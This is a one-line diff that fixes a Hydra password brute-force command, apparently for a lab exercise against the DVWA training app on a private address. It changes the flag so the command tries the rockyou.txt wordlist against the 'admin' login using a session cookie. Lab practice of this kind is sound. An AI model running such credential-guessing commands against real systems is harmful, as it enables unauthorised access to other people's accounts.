@@ -1,1 +1,1 @@
-hydra 192.168.56.11 -V -v -l admin -p /usr/share/wordlists/rockyou.txt http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=bkanvhc57tl4ola1keunefuon0; security=low:F=Username and/or password incorrect"
+hydra 192.168.56.11 -V -v -l admin -P /usr/share/wordlists/rockyou.txt http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=bkanvhc57tl4ola1keunefuon0; security=low:F=Username and/or password incorrect"
